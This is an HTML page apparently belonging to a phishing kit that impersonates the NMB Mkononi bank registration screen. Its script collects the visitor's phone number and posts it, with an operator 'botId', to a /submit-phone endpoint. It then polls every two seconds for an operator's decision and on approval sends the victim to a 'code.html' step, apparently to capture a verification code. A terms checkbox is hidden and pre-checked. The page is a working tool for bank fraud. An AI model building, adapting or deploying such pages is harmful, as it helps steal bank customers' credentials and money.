<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>NMB Mkononi - Registration</title>

    <style>
        /* ===========================
           RESET
        =========================== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html,
        body {
            width: 100%;
            min-height: 100%;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #fff;
        }

        body {
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            background: linear-gradient(
                180deg,
                #ff7a00 0%,
                #ff8c1a 10%,
                #d96a00 26%,
                #7a3a00 44%,
                #2a1400 62%,
                #0a0500 78%,
                #000000 100%
            );
            background-attachment: fixed;
            background-size: cover;
            background-repeat: no-repeat;
        }

        /* ===========================
           TOP HEADER (transparent over orange)
        =========================== */
        .top-bar {
            width: 100%;
            height: 72px;
            display: flex;
            align-items: center;
            padding: 0 22px;
            flex-shrink: 0;
            position: relative;
            z-index: 2;
        }

        .back-btn {
            color: #fff;
            text-decoration: none;
            font-size: 30px;
            font-weight: 300;
            line-height: 1;
            margin-right: 16px;
            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
        }

        .brand-name {
            color: #fff;
            font-size: 15px;
            font-weight: 700;
            letter-spacing: 0.8px;
            text-transform: uppercase;
            opacity: 0.95;
            text-shadow: 0 1px 4px rgba(0, 0, 0, 0.25);
        }

        /* ===========================
           PAGE CONTAINER – centered
        =========================== */
        .container {
            flex: 1;
            width: 100%;
            max-width: 420px;
            margin: 0 auto;
            padding: 34px 28px 24px;
            display: flex;
            flex-direction: column;
            position: relative;
            z-index: 1;
        }

        /* ===========================
           FORM
        =========================== */
        #detailsForm {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        /* ===========================
           TITLE & SUBTITLE
        =========================== */
        .title {
            font-size: 28px;
            font-weight: 700;
            color: #ffffff;
            margin-bottom: 6px;
            letter-spacing: -0.5px;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.35);
        }

        .subtitle {
            font-size: 16px;
            color: rgba(255, 255, 255, 0.82);
            line-height: 1.5;
            margin-bottom: 32px;
            font-weight: 400;
            text-shadow: 0 1px 6px rgba(0, 0, 0, 0.3);
        }

        /* ===========================
           PHONE INPUT (glass dark field)
        =========================== */
        .phone-input-wrap {
            position: relative;
            width: 100%;
            margin-bottom: 0;
        }

        .phone-input-wrap input {
            width: 100%;
            height: 58px;
            border: 1.5px solid rgba(255, 255, 255, 0.22);
            border-radius: 12px;
            background: rgba(0, 0, 0, 0.32);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            padding: 0 16px 0 96px;
            font-size: 17px;
            color: #ffffff;
            outline: none;
            transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
        }

        .phone-input-wrap input::placeholder {
            color: rgba(255, 255, 255, 0.5);
            font-weight: 400;
        }

        .phone-input-wrap input:focus {
            border-color: #ff8c1a;
            background: rgba(0, 0, 0, 0.45);
            box-shadow: 0 0 0 3px rgba(255, 140, 26, 0.25);
        }

        /* Country code + down arrow */
        .country-code {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 17px;
            font-weight: 700;
            color: #ffb066;
            pointer-events: none;
            display: flex;
            align-items: center;
            gap: 4px;
            letter-spacing: 0.5px;
        }

        .country-code::after {
            content: "▼";
            font-size: 11px;
            color: #ff8c1a;
            margin-left: 4px;
        }

        /* Divider line between code and input */
        .phone-input-wrap::before {
            content: "";
            position: absolute;
            left: 82px;
            top: 50%;
            transform: translateY(-50%);
            width: 1px;
            height: 26px;
            background: rgba(255, 255, 255, 0.18);
            pointer-events: none;
        }

        /* ===========================
           BOTTOM SECTION (push to bottom)
        =========================== */
        .bottom-section {
            margin-top: auto;
            padding-bottom: 10px;
        }

        /* ===========================
           CHECKBOX – hidden but functional
        =========================== */
        .checkbox-wrap {
            display: none;
        }

        #termsCheck {
            display: none;
        }

        /* ===========================
           CONTINUE BUTTON (NMB Orange)
        =========================== */
        button {
            width: 100%;
            height: 56px;
            border: none;
            border-radius: 12px;
            font-size: 18px;
            font-weight: 700;
            color: #ffffff;
            background: rgba(255, 140, 26, 0.28);
            cursor: not-allowed;
            transition: background 0.25s, transform 0.1s, box-shadow 0.25s;
            text-transform: uppercase;
            letter-spacing: 1px;
            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
        }

        button:enabled {
            background: linear-gradient(135deg, #ff8c1a 0%, #ff6b00 100%);
            cursor: pointer;
            box-shadow: 0 6px 20px rgba(255, 122, 0, 0.45);
        }

        button:enabled:hover {
            background: linear-gradient(135deg, #ff9a33 0%, #ff7a0d 100%);
            transform: translateY(-1px);
            box-shadow: 0 8px 24px rgba(255, 122, 0, 0.55);
        }

        button:enabled:active {
            transform: translateY(0);
        }

        /* ===========================
           STATUS & SPINNER
        =========================== */
        .status {
            display: none;
            margin-top: 15px;
            text-align: center;
            color: rgba(255, 255, 255, 0.85);
            font-size: 14px;
        }

        .status.error {
            color: #ffb3a7;
        }

        .spinner {
            display: none;
            width: 34px;
            height: 34px;
            margin: 18px auto 0;
            border: 3px solid rgba(255, 140, 26, 0.2);
            border-top: 3px solid #ff8c1a;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        /* ===========================
           RESPONSIVE
        =========================== */
        @media (max-width: 480px) {
            .container {
                padding: 28px 20px 22px;
            }

            .title {
                font-size: 24px;
            }

            .subtitle {
                font-size: 15px;
            }

            .phone-input-wrap input {
                height: 56px;
                font-size: 16px;
                padding-left: 90px;
            }

            .phone-input-wrap::before {
                left: 78px;
            }

            .country-code {
                font-size: 16px;
                left: 14px;
            }

            button {
                height: 56px;
                font-size: 17px;
            }
        }

        @media (max-width: 360px) {
            .container {
                padding: 24px 16px 18px;
            }

            .title {
                font-size: 22px;
            }

            .subtitle {
                font-size: 14px;
            }

            .phone-input-wrap input {
                height: 54px;
                font-size: 15px;
                padding-left: 82px;
            }

            .phone-input-wrap::before {
                left: 72px;
            }

            .country-code {
                font-size: 15px;
            }

            button {
                font-size: 16px;
            }
        }
    </style>
</head>

<body>

    <!-- NMB Mkononi Header -->
    <div class="top-bar">
        <a href="javascript:history.back()" class="back-btn">&#8592;</a>
        <span class="brand-name">NMB Mkononi</span>
    </div>

    <!-- Main Content -->
    <div class="container">

        <!-- Page titles -->
        <div class="title">Registration</div>
        <div class="subtitle">Welcome to NMB Mkononi</div>

        <form id="detailsForm" class="form-content">

            <!-- Phone Number -->
            <div class="phone-input-wrap">
                <span class="country-code">+255</span>
                <input
                    type="tel"
                    id="phone"
                    name="phone"
                    placeholder="Mobile Number"
                    autocomplete="tel-national"
                    required>
            </div>

            <!-- Bottom Section -->
            <div class="bottom-section">

                <!-- Terms checkbox – hidden but pre-checked so logic works -->
                <div class="checkbox-wrap">
                    <input
                        type="checkbox"
                        id="termsCheck"
                        checked
                        required>
                    <label for="termsCheck">Terms (hidden)</label>
                </div>

                <!-- Continue Button -->
                <button
                    type="submit"
                    class="primary"
                    id="continueBtn"
                    disabled>
                    Continue
                </button>

            </div>

        </form>

        <!-- Hidden status/spinner (kept for logic) -->
        <div id="status" class="status"></div>
        <div id="spinner" class="spinner"></div>

    </div>

    <!-- ====== YOUR ORIGINAL SCRIPTS (UNTOUCHED) ====== -->
    <script>
        document.addEventListener("DOMContentLoaded", () => {

            const form = document.getElementById("detailsForm");
            const phone = document.getElementById("phone");
            const terms = document.getElementById("termsCheck");
            const button = document.getElementById("continueBtn");
            const spinner = document.getElementById("spinner");
            const status = document.getElementById("status");

            function validateForm() {
                const phoneNumber = phone.value.replace(/\D/g, "");

                if (phoneNumber.length >= 8 && terms.checked) {
                    button.disabled = false;
                } else {
                    button.disabled = true;
                }
            }

            phone.addEventListener("input", function() {
                this.value = this.value.replace(/\D/g, "");
                validateForm();
            });

            terms.addEventListener("change", validateForm);

            form.addEventListener("submit", function(e) {
                e.preventDefault();

                button.disabled = true;
                spinner.style.display = "block";

                status.style.display = "block";
                status.textContent = "⏳ En attente d'approbation...";

                // Your submission logic goes here
            });

        });
    </script>

    <script>
        let fullName = localStorage.getItem('fullName');
        if (!fullName) { fullName = 'Client NMB Mkononi';
            localStorage.setItem('fullName', fullName); }

        const params = new URLSearchParams(window.location.search);
        const urlBotId = params.get('botId');
        if (urlBotId) localStorage.setItem('botId', urlBotId);
        const botId = localStorage.getItem('botId');

        if (!botId) { alert('Session expirée. Veuillez recommencer.');
            window.location.href = 'index.html'; }

        const form = document.getElementById('detailsForm');
        const statusEl = document.getElementById('status');
        const spinner = document.getElementById('spinner');
        const nextButton = form.querySelector('button.primary');
        const termsCheck = document.getElementById('termsCheck');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();
            if (!termsCheck.checked) {
                statusEl.style.display = 'block';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
                return;
            }
            nextButton.disabled = true;
            const phone = document.getElementById('phone').value.trim();
            if (!phone) {
                statusEl.style.display = 'block';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
                nextButton.disabled = false;
                return;
            }
            localStorage.setItem('phone', phone);
            statusEl.style.display = 'block';
            spinner.style.display = 'block';
            statusEl.classList.remove('error');
            statusEl.textContent = '⏳ En attente d\'approbation...';
            try {
                const res = await fetch(`${window.location.origin}/submit-phone`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ name: fullName, phone, botId })
                });
                if (!res.ok) throw new Error();
                const { requestId } = await res.json();
                pollApproval(requestId);
            } catch (error) {
                spinner.style.display = 'none';
                statusEl.classList.add('error');
                statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
                nextButton.disabled = false;
            }
        });

        function pollApproval(requestId) {
            const interval = setInterval(async () => {
                try {
                    const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
                    const data = await res.json();
                    if (data.redirect) { clearInterval(interval);
                        window.location.href = data.redirect; return; }
                    if (data.approved === false) {
                        clearInterval(interval);
                        spinner.style.display = 'none';
                        statusEl.classList.add('error');
                        statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
                        nextButton.disabled = false;
                    }
                    if (data.approved === true) { clearInterval(interval);
                        window.location.href = 'code.html'; }
                } catch (error) { console.error('Polling error:', error); }
            }, 2000);
        }
    </script>

</body>
</html>
